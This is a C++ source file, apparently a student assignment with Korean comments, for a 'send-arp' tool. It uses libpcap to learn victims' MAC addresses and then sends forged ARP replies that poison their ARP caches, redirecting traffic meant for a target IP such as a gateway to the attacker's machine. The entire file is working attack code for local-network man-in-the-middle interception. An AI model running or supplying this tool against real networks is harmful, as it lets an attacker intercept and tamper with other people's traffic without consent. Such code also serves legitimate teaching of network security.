#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iso646.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;
#pragma pack(push, 1)
#pragma pack(pop)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};

bool argv_check(int argc, char *argv[]);
bool IsAvailableIP(const char *szIP);
bool get_IP_and_MAC(const char *ifr, unsigned int *ip, unsigned char *mac);
bool get_MAC_by_ARP(pcap_t *handle, const EthArpPacket sendpk, const char *ip, unsigned char *mac);

int main(int argc, char *argv[])
{
	//매개변수 확인(4개보다 작거나 불완전 입력인지 + ip 주소 제대로 입력했는지)
	if (not argv_check(argc, argv))
		return -1;

	//pcap_open
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, PCAP_ERRBUF_SIZE, 1, 1, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	//attacker(me)의 ip, mac 주소 알아내기
	unsigned int my_ip;
	unsigned char my_mac[7] = {};
	if (not get_IP_and_MAC(argv[1], &my_ip, my_mac))
	{
		fprintf(stderr, "couldn't get ip address of me\n");
		return -1;
	}
	//printf("attacker_ip: %s\n", string(Ip(my_ip)).c_str());
	//printf("attacker_mac: %s\n", string(Mac(my_mac)).c_str());

	//sender(victim, you)의 mac 주소 알아내기
	//sender를 향해 ARP request를 보내고 reply를 받아서 알 수 있음
	unsigned char sender_mac[argc / 2 - 1][7] = {};
	EthArpPacket packet;
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.sip_ = htonl(Ip(my_ip));
	for (int i = 1; i < argc / 2; i++)
	{
		packet.arp_.tip_ = htonl(Ip(argv[2 * i]));
		if (not get_MAC_by_ARP(handle, packet, argv[2 * i], sender_mac[i]))
			return -1;
		//printf("sender_mac: %s\n", string(Mac(sender_mac[i])).c_str());
	}

	//변조된 ARP reply 보내기
	//eth의 dmac과 smac은 당연히 각각 attacker(me)와 sender(victim)
	//sip = target_ip, smac = me_mac, tip = sender_ip, tmac = sender_mac
	//결과적으로 위의 request packet과 아래 내용만 다름
	packet.arp_.op_ = htons(ArpHdr::Reply);
	for (int i = 1; i < argc / 2; i++)
	{
		packet.eth_.dmac_ = Mac(sender_mac[i]);
		packet.arp_.tmac_ = Mac(sender_mac[i]);
		packet.arp_.sip_ = htonl(Ip(argv[2 * i + 1]));
		packet.arp_.tip_ = htonl(Ip(argv[2 * i]));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
		if (res != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}
	}
	printf("ARP spoofing SUCCESS!\n");
	pcap_close(handle);
}

bool argv_check(int argc, char *argv[])
{
	if ((argc < 4) or (argc % 2))
	{
		printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
		printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
		return false;
	}
	for (int i = 2; i < argc; i++)
	{
		if (IsAvailableIP(argv[i]))
			continue;
		printf("%s is not valueable ip addr.\n", argv[3]);
		return false;
	}
	return true;
}
bool IsAvailableIP(const char *szIP)
{
	if (szIP == NULL)
		return false;
	int len = strlen(szIP);
	// 7자( 1.1.1.1 ) 이상&& 15자( 123.123.123.123 ) 이하
	if (len > 15 || len < 7)
		return false;
	int nNumCount = 0;
	int nDotCount = 0;
	// 유효성검사
	for (int i = 0; i < len; i++)
	{
		if (szIP[i] < '0' || szIP[i] > '9')
		{
			if ('.' == szIP[i])
			{
				++nDotCount;
				nNumCount = 0;
			}
			else
				return false;
		}
		else
		{
			if (++nNumCount > 3)
				return false;
		}
	}
	if (nDotCount != 3)
		return false;
	return true;
}
bool get_IP_and_MAC(const char *ifr, unsigned int *ip, unsigned char *mac)
{
	int sockfd;
	struct ifreq ifrq;
	struct sockaddr_in *sin;
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0)
	{
		fprintf(stderr, "Fail to get interface IP address - socket() failed\n");
		return -1;
	}
	strcpy(ifrq.ifr_name, ifr);

	//get_ip
	if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0)
	{
		perror("ioctl() SIOCGIFADDR error");
		return false;
	}
	uint8_t ip_arr[Ip::SIZE];
	sin = (struct sockaddr_in *)&ifrq.ifr_addr;
	memcpy(ip_arr, (void *)&sin->sin_addr, sizeof(sin->sin_addr));
	*ip = (ip_arr[0] << 24) | (ip_arr[1] << 16) | (ip_arr[2] << 8) | (ip_arr[3]);

	//get_mac
	if (ioctl(sockfd, SIOCGIFHWADDR, &ifrq) < 0)
	{
		perror("ioctl() SIOCGIFHWADDR error");
		return false;
	}
	memcpy(mac, ifrq.ifr_hwaddr.sa_data, Mac::SIZE);

	close(sockfd);
	return true;
}

bool get_MAC_by_ARP(pcap_t *handle, const EthArpPacket sendpk, const char *ip, unsigned char *mac)
{
	struct pcap_pkthdr *header;
	const u_char *packet;
	while (1)
	{
		//request 송신
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&sendpk), sizeof(EthArpPacket));
		if (res != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			break;
		}

		//reply 수신
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0)
			continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		//get_mac
		EthArpPacket *ARPpacket = (EthArpPacket *)packet;
		if (not(ntohs(ARPpacket->eth_.type_) == EthHdr::Arp))
			continue;
		if (not(ntohl(ARPpacket->arp_.sip_) == Ip(ip)))
			continue;
		memcpy(mac, &ARPpacket->arp_.smac_, Mac::SIZE);
		return true;
	}
	return false;
}
